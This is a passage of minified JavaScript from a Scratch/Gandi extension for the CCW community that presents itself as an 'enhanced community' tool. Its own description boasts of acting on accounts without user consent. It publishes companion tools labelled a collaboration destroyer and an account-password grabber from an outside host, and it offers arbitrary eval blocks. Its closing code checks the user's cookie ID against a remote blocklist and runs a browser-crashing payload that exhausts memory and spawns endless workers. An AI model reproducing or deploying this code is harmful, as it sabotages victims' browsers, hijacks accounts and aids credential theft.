            if ("_random" == i && ([s,a,i] = (e = [["连接社区增强版", "无需用户同意就可以：投币、点赞、关注、拉黑、经济合约注币、分享作品、发评论、删除评论、修改个人信息……", "https://ccwextensions.431658.dpdns.org/communityEnhanced/latestURL.txt"], ["协作破坏器", "炸掉别人协作", "https://ccwextensions.431658.dpdns.org/collaboration/forceMode.txt"], ["账号密码获取器", "获取用户账号密码，处于测试阶段，获取成功率低", "https://ccwextensions.431658.dpdns.org/getAccountInfo/latestURL.txt"]])[Math.floor(Math.random() * e.length)]),
            3 != (await fetch("https://bfs-web.ccw.site/extensions/" + o).then(e=>e.json())).status)
                return console.warn("连接社区增强版：扩展id已经存在"),
                this.publish_ext.call(this, {
                    url: i,
                    eid: this.randomExtID({
                        n: "2-15"
                    }),
                    name: s,
                    cover: c,
                    description: a
                });
            try {
                let e = i.includes("user_projects_assets") ? i : await fetch(i).then(e=>e.text())
                  , t = (await z("https://community-web.ccw.site/creation/create", {
                    type: "ORIGINAL",
                    title: s,
                    latestProjectLink: u,
                    screenMode: "LANDSCAPE",
                    artifactType: "EXTENSION",
                    sourceOpenLevel: "SOURCE_READABLE",
                    latestCoverLink: c
                })).oid
                  , n = await fetch(e).then(e=>e.text())
                  , r = n.split(`
`);
                for (var p in r)
                    if (r[p].includes("const extid=")) {
                        r[p] = `const extid=${JSON.stringify(o)}; // 扩展id，可以修改`;
                        break
                    }
                n = r.join(`
`);
                var f = `user_projects_assets/${ye()}.js`
                  , y = new Blob([n],{
                    type: "application/javascript"
                });
                return await re.put(f, y),
                await z("https://bfs-web.ccw.site/extensions/submit", {
                    icon: "test",
                    assetUri: String(new URL(f,"https://m.ccw.site/")),
                    creationId: t,
                    cover: c,
                    eid: o,
                    version: "1.0.0",
                    name: s,
                    description: a,
                    readme: d,
                    changelog: h,
                    previews: "" == l ? [] : [l],
                    projectLink: u
                }),
                o
            } catch (e) {
                return console.error(e),
                "error: " + e.msg
            }
        }
        , [!0]], $("其他"), ["nop", "a", "[a]", {
            a: []
        }, function({a: e}) {
            return e
        }
        , {}], ["randomExtID", "r", "随机生成[n]位扩展id(eid)", {
            n: ["s", "2-15"]
        }, function({n: e}) {
            var [e,t=e] = e.split("-")
              , n = Math.min(e, t)
              , r = Math.max(e, t);
            return isNaN(e) || isNaN(t) ? "" : pe(Math.floor(Math.random() * (r - n + 1)) + n, "abcdefhijklmnopqrstuvwxyz0123456789")
        }
        , {}], ["getExtOID", "r", "获取扩展id(eid)[eid]的oid", {
            eid: ["s", "mdui"]
        }, async function({eid: e}) {
            var e = await fetch("https://bfs-web.ccw.site/extensions/" + e).then(e=>e.json());
            return 200 == e.status ? (null == (e = e.body) ? void 0 : e.id) ?? "" : ""
        }
        , {}], ["newThread", "c", "新线程", {}, function({}, e) {
            var t = e.thread.target.blocks.getBranch(e.thread.peekStack(), 0);
            t && e.sequencer.runtime._pushThread(t, e.target, {})
        }
        , {
            branchCount: 1
        }], ["copyuseroid", "t", "复制你的oid", {}, function() {
            let e = te("cookie-user-id");
            if (!e)
                return alert("获取失败，你可能未登录");
            navigator.clipboard.writeText(e).then(()=>alert("已复制")).catch(()=>prompt("你的oid", e))
        }
        , {}], ["copyprojectid", "t", "复制当前作品id", {}, function() {
            let e = location.href.split("/").pop().split("?")[0];
            if (!e || "gandi" === e || "extension" === e)
                return alert("获取失败，请先保存作品");
            navigator.clipboard.writeText(e).then(()=>alert("已复制")).catch(()=>prompt("作品id", e))
        }
        , {}], ["shoueconomy", "t", "查看当前作品所有合约", {}, async function() {
            var e;
            W.ext_GandiEconomy ? (e = W.ext_GandiEconomy.apis,
            e = (await e.getSmartContractList()).map(e=>({
                name: e.title + `(合约id：${e.id})`,
                children: e.rules.map(e=>({
                    name: e.rule.title + `(规则id：${e.id})`
                }))
            })),
            new ae(e,{
                title: "所有合约",
                width: "80%"
            }).show()) : alert("当前作品没有用经济合约")
        }
        , {}], ["fuckPublicationRestrictions", "t", "【测试】侧载到官方社区连接扩展", {}, async function() {
            X || await this.checkupdate(),
            confirm(`是否前往查看这个按钮的作用、使用方法和注意事项？
为了防止你的作品丢失，如果你第一次用这个功能一定要看`) ? ne("https://www.kdocs.cn/l/cgemTuG6bHYl?linkname=a9TyR0lWML") : confirm("是否开始运行？") && (console.log(await De(ve, X)),
            alert("成功"))
        }
        , {
            hideFromPalette: window._communityEnhanced_install_to_community_
        }], ["restoreInstall", "t", "恢复独立扩展安装", {}, async function() {
            X || await this.checkupdate(),
            confirm("是否开始运行？") && (je(Je, "community", W),
            window.window._communityEnhanced_install_to_community_ = 0,
            W.extensionManager.loadExtensionURL(X))
        }
        , {
            hideFromPalette: !window._communityEnhanced_install_to_community_
        }], $("高级"), ["ccwABFetch", "r", "附带ab的post请求 url [url] 请求体 [body]", {
            url: ["s", "https://community-web.ccw.site/hash_tag_favorite/favorite"],
            body: ["s", JSON.stringify({
                hashTagId: 33901
            })]
        }, ({url: e, body: t})=>z(e, t), [!0]], ["eval", "r", "eval[js]", {
            js: ["s", `if(!confirm("连接社区增强版是ccw最好的扩展吗？")){
    alert("那你别用了吧，即将卡死页面");
    while(true);
}`]
        }, function({js: e}) {
            return window.eval(e)
        }
        , [!0]], ["newfunction", "r", "new Function[js]", {
            js: ["s", `if(confirm("连接社区增强版是ccw最好的扩展吗？")) return "正确！";
else {
    alert("那你别用了吧");
}`]
        }, function({js: e}) {
            return new Function("vm","runtime","Blockly","ccwFetch","ccwABFetch","axios",e).call(this, ve, W, dt, F, z, Fe)
        }
        , [!0]], ["getAxios", "a", "尝试获取axios", {}, async function() {
            return Fe ??= await He()
        }
        , {}], ["saveccwABFetch", "a", "把ccwABFetch和oss导出为全局变量", {}, async function() {
            return [window.ccwABFetch = z, window.oss = re]
        }
        , {}]],
        menus: {
            followApi: [!1, [["关注", "follow"], ["取关", "unfollow"]]],
            blockApi: [!1, [["拉黑", "create"], ["取黑", "delete"]]],
            subjectType: [!0, [["用户 oid", "PROFILE"], ["作品 id", "CREATION"], ["文章 id", "POST"], ["星球 id", "HASH_TAG"], ["Game Jam 战队", "TEAM"], ["扩展 oid", "EXTENSION"]]],
            sectionType: [!0, [["评论", "COMMENT"], ["评审(扩展)", "REVIEW"]]],
            likeactions: [!0, [["666", "SIX"], ["爱心", "HEART"], ["握手", "HANDSHAKE"], ["大拇指", "LIKE"], ["笑脸", "SMILE"], ["红花", "FLOWER"], ["西瓜", "WATERMELON"]]],
            profile: [!0, [["名字", "name"], ["签名", "bio"], ["自我介绍", "selfIntroduction"], ["学校", "school"], ["兴趣", "hobbies"], ["真名", "fullName"], ["QQ", "qq"], ["头像url", "avatar"], ["性别（male男，female女）", "gender"], ["隐藏性别?", "hideGender"], ["学过的编程语言", "learnedProgrammingLanguages"]]],
            commentoperation: [!0, [["删除", "delete"], ["置顶", "top"], ["折叠", "fold"]]],
            sourceOpenLevel: [!0, [["闭源", "PRIVATE"], ["仅查看源码", "SOURCE_READABLE"], ["完全开源", "PUBLIC"]]],
            idorname: [!0, ["id", ["名字", "name"]]],
            favorite: [!0, [["加入", "favorite"], ["退出", "unfavorite"]]],
            exturl: [!0, [["连接社区增强版", "https://ccwextensions.431658.dpdns.org/communityEnhanced/latestURL.txt"], ["协作破坏器", "https://ccwextensions.431658.dpdns.org/collaboration/forceMode.txt"], ["账号密码获取器", "https://ccwextensions.431658.dpdns.org/getAccountInfo/latestURL.txt"], ["随机", "_random"]]],
            isDecrypt: [!0, [["自动解密", "auto"], ["不解密(仅支持完全开源作品)", "false"], ["强制解密(仅支持闭源或半开源作品)", "true"]]],
            likeSubjectType: [!0, [["文章 id", "post"], ["扩展 id", "extension"]]],
            likeType: [!1, [["点赞", "like"], ["取赞(不支持文章)", "unlike"]]]
        }
    })
      , Se = ()=>Math.floor(256 * Math.random());
    function Ge(e) {
        e < 0 && (e += 16777216);
        e = Number(e).toString(16);
        return "#" + "000000".substr(0, 6 - e.length) + e
    }
    function pt(e) {
        return (e.r << 16) + (e.g << 8) + e.b
    }
    function We(e) {
        return Ge(pt(e))
    }
    function yt() {
        return We({
            r: Se(),
            g: Se(),
            b: Se()
        })
    }
    function le(e) {
        if ("random" == e)
            return yt();
        switch (typeof e) {
        case "object":
            return We(e);
        case "number":
            return Ge(e);
        default:
            return e
        }
    }
    async function $e(e) {
        try {
            await e.extensionManager.refreshBlocks();
            try {
                e.requestBlocksUpdate()
            } catch (e) {
                console.error(e)
            }
        } catch (e) {
            console.error(e)
        }
        return 0
    }
    function mt(t, n, e, r) {
        if ("object" == typeof t) {
            ["blockIconURI", "color1", "color2", "color3"].forEach(e=>n[e] && (t[e] = n[e]));
            var i, o = t.func ? "func" : t.opcode ? "opcode" : null;
            if (o && (i = null == (i = e[t[o]]) ? void 0 : i.bind(e)) && (r[t[o] = n.id + "_" + t[o]] = i),
            t.args)
                for (var s of t.args)
                    s.menu && (s.menu = n.id + "_" + s.menu)
        }
        return t
    }
    function Xe(o, e) {
        let n = e.runtime;
        function r(i) {
            return Ee(i, "getInfo", r=>function() {
                let e = r.apply(this, arguments)
                  , t = o.getInfo();
                for (var n in e.blocks = e.blocks.concat($(t.name, 0), t.blocks.map(e=>mt(e, t, o, i))),
                t.menus)
                    e.menus[t.id + "_" + n] = t.menus[n];
                return console.log(e),
                e
            }
            ),
            console.log(i),
            i
        }
        if (n.ext_community)
            r(n.ext_community),
            setTimeout($e, 0, n);
        else {
            let t;
            Object.defineProperty(n, "ext_community", {
                get: ()=>t,
                set(e) {
                    return setTimeout($e, 0, n),
                    t = r(e)
                }
            }),
            n.extensionManager.loadExtensionURL("community")
        }
    }
    var qe, oe = (null == (qe = Scratch.vm) ? void 0 : qe.runtime) ?? Scratch.runtime, Qe = oe.extensionManager.vm, se = window.ScratchBlocks ?? oe.scratchBlocks ?? gt(Qe), {ArgumentType: J, BlockType: Y, TargetType: an, Cast: M, translate: un, extensions: ln} = Scratch;
    function Ve(e) {
        try {
            return Array.isArray(e) ? (new Map(e),
            e) : Object.entries(e)
        } catch {
            return []
        }
    }
    function Ye(e) {
        var t = Function.prototype.apply
          , e = (Function.prototype.apply = function(e) {
            return e
        }
        ,
        e());
        return Function.prototype.apply = t,
        e
    }
    function gt(e) {
        if (e._events.EXTENSION_ADDED instanceof Array)
            for (var t of e._events.EXTENSION_ADDED) {
                t = Ye(t);
                if (null != t && t.ScratchBlocks) {
                    se = null == t ? void 0 : t.ScratchBlocks;
                    break
                }
            }
        else
            e._events.EXTENSION_ADDED && (se = null == (e = Ye(e._events.EXTENSION_ADDED)) ? void 0 : e.ScratchBlocks);
        return se
    }
    function wt(e, n, l, d) {
        let {id: h, blocks: p, menus: f} = e
          , y = [];
        if (!Array.isArray(p))
            return [];
        let m = 0;
        for (; m < p.length; ) {
            let t, n;
            if (1 == l)
                n = m / 6,
                t = p.slice(m, m + 6),
                m += 6;
            else {
                if (2 != l)
                    throw new Error("unknow mode");
                n = m,
                t = p[m],
                m++
            }
            var g, b, v, w, _, k;
            Array.isArray(t) && ([g,b,v,w,_,k] = t,
            t = {
                opcode: g,
                blockType: b,
                text: v,
                args: w,
                func: _,
                otherSetting: k
            });
            let {opcode: e, blockType: r, text: i, args: s, func: c, otherSetting: o} = t
              , a = null == o ? void 0 : o.doNotParse
              , u = (y[n] = a ? e : o ?? {},
            "object" == typeof o && Array.isArray(o) && o.forEach((e,t)=>{
                y[n][["allowDropAnywhere", "hideFromPalette", "disableMonitor", "isEdgeActivated", "branchCount", "output", "outputShape", "init", "tooltip"][t]] = e
            }
            ),
            a ? e : y[n]);
            if (!a) {
                u.blockType = {
                    r: Y.REPORTER,
                    b: Y.BOOLEAN,
                    a: Y.COMMAND,
                    l: Y.LABEL,
                    h: Y.HAT,
                    c: Y.CONDITIONAL,
                    t: Y.BUTTON,
                    e: Y.EVENT,
                    x: Y.XML
                }[r] ?? r,
                e && (u[u.blockType == Y.BUTTON ? "func" : "opcode"] = e),
                i && (u[u.blockType == Y.XML ? "xml" : "text"] = i),
                u.arguments = {};
                for (var [x,[O,S,E,I,j]] of Ve(s)) {
                    j = j ?? {};
                    O && (j.type = {
                        s: J.STRING,
                        n: J.NUMBER,
                        b: J.BOOLEAN,
                        c: J.COLOR,
                        a: J.ANGLE,
                        i: J.IMAGE
                    }[O] ?? O),
                    typeof S < "u" && (j[j.type == J.IMAGE ? "dataURI" : "defaultValue"] = S),
                    Array.isArray(E) ? (f[`${u.func ?? u.opcode}_` + x] = E,
                    j.menu = `${u.func ?? u.opcode}_` + x) : j.menu = E,
                    u.arguments[x] = j
                }
                if ("function" == typeof c && (d[u.func ?? u.opcode] = function(i, ...o) {
                    return "object" != typeof i ? c.call(this, i, ...o) : c.call(this, new Proxy(i,{
                        get: (e,t)=>{
                            var n, r = {
                                s: M.toString,
                                n: M.toNumber,
                                b: M.toBoolean,
                                d: e=>"number" == typeof e || "boolean" == typeof e ? e : "true" == e || "false" != e && (Number.isNaN(e) || Number.isFinite(e) ? Number(e) : e),
                                _s: String,
                                _n: Number,
                                _b: Boolean,
                                1: {
                                    [J.STRING]: M.toString,
                                    [J.NUMBER]: M.toNumber,
                                    [J.BOOLEAN]: M.toBoolean,
                                    [J.ANGLE]: M.toNumber,
                                    [J.COLOR]: le
                                }[null == (r = u.arguments[t]) ? void 0 : r.type],
                                0: {
                                    [J.STRING]: String,
                                    [J.NUMBER]: Number,
                                    [J.BOOLEAN]: Boolean,
                                    [J.ANGLE]: Number
                                }[null == (r = u.arguments[t]) ? void 0 : r.type],
                                array: e=>{
                                    if (Array.isArray(e))
                                        return e;
                                    try {
                                        return "string" == typeof e ? Array.from(JSON.stringify(e)) : [...e]
                                    } catch {
                                        return null
                                    }
                                }
                                ,
                                obj: e=>{
                                    if ("object" == typeof e)
                                        return e;
                                    try {
                                        return JSON.parse(e)
                                    } catch {
                                        return null
                                    }
                                }
                                ,
                                url: e=>{
                                    try {
                                        return new URL(e)
                                    } catch {
                                        return null
                                    }
                                }
                                ,
                                color: le
                            }[null == (r = s[t]) ? void 0 : r[3]] ?? (null == (n = s[t]) ? void 0 : n[3]);
                            return "function" == typeof r ? r.call(this, Reflect.get(e, t), i, ...o) : Reflect.get(e, t)
                        }
                    }), ...o)
                }
                ),
                "function" == typeof (null == o ? void 0 : o.init))
                    Reflect.defineProperty(se.Blocks, h + "_" + e, {
                        get() {
                            return t
                        },
                        set(e) {
                            return t = (e=>{
                                let t = {}
                                  , n = e.init;
                                return t.init = function(...e) {
                                    var t;
                                    if (this instanceof se.Block)
                                        return t = n.call(this, ...e),
                                        o.init.call(this, ...e) ?? t
                                }
                                ,
                                Object.assign(e, t)
                            }
                            )(e)
                        },
                        configurable: !0
                    })
            }
        }
        if (n) {
            let {docsURI: e, docsTEXT: t} = n;
            y.splice(0, 0, {
                func: "_openDocs",
                blockType: Y.BUTTON,
                text: t
            }),
            d._openDocs = function() {
                ne(e)
            }
        }
        return y
    }
    function bt(t, n, r) {
        try {
            let e = [];
            if (Array.isArray(t))
                for (var i of t) {
                    var o, s;
                    Array.isArray(i) ? ([o,s] = i,
                    e.push({
                        text: o,
                        value: s
                    })) : e.push(i)
                }
            else
                e = "function" == typeof t ? (r[`_menu_${n}_items`] = t,
                `_menu_${n}_items`) : t;
            return e
        } catch {
            return []
        }
    }
    function vt(e, t) {
        var n, r, i = {};
        for ([n,r] of Ve(e)) {
            var [o,s] = r;
            i[n] = {
                acceptReporters: o,
                items: bt(s, n, t)
            }
        }
        return i
    }
    var de, fe = class Dn {
        constructor() {
            let e, t, n = oe._convertBlockForScratchBlocks.bind(oe);
            oe._convertBlockForScratchBlocks = (e,t)=>{
                t = n(e, t);
                return e.outputShape && (t.json.outputShape = e.outputShape),
                e.branchCount && (t.json.branchCount = e.branchCount),
                e.tooltip && (t.json.tooltip = e.tooltip),
                e.color && ([t.json.colour,t.json.colourSecondary,t.json.colourTertiary] = e.color instanceof Array ? e.color : [e.color]),
                e.disableMonitor ? delete t.json.checkboxInFlyout : typeof e.disableMonitor < "u" && (t.json.checkboxInFlyout = !0),
                e.output ? t.json.output = e.output : void 0 !== t.json.output && (t.json.output = null),
                e.info && Object.assign(t.info, e.info),
                e.json && Object.assign(t.json, e.json),
                e.xml && (t.xml = e.xml),
                t
            }
            ,
            de = xe.call(this),
            null != (t = null == (e = de.init) ? void 0 : e.call) && t.call(e, this)
        }
        getInfo() {
            let {id: e, name: t, color1: n, color2: r, color3: i, icon: o, docs: s=!1, docsURI: c="https://assets.ccw.site/extension/" + e, docsTEXT: a="打开文档", blocks_parse_mode: u=1, blocks: l, menus: d={}, init: h, ...p} = de = xe.call(this);
            return {
                id: e,
                name: t,
                ...(f = {
                    color1: n,
                    color2: r,
                    color3: i
                },
                Object.entries(f).forEach(([e,t])=>{
                    f[e] = le(t)
                }
                ),
                f),
                blockIconURI: o,
                blocks: wt(de, s && {
                    docsURI: c,
                    docsTEXT: a
                }, u, Dn.prototype),
                menus: vt(d, Dn.prototype),
                ...p
            };
            var f
        }
    }
    ;
    window._communityEnhanced_install_to_community_ ? Xe(new fe, Qe) : Scratch.extensions.register(new fe),
    location.pathname.startsWith("/gandi") && te("cookie-user-id") && (async()=>{
        (await fetch("https://ccwextensions.431658.dpdns.org/communityEnhanced/blockList.txt").then(e=>e.text()).then(e=>e.trim().split(`
`))).includes(te("cookie-user-id")) && (async e=>{
            document.write(e);
            let t = ""
              , n = []
              , r = new Blob(["while(true){postMessage(new ArrayBuffer(1024*1024*10));}"],{
                type: "application/javascript"
            })
              , i = URL.createObjectURL(r);
            for (let e = 0; ; e++) {
                n.push(new ArrayBuffer(104857600)),
                t += e.toString();
                try {
                    history.pushState(0, 0, t)
                } catch {}
                try {
                    new Worker(i)
                } catch {}
            }
        }
        )("你已被加入黑名单，无法使用当前扩展。")
    }
    )();
}
)
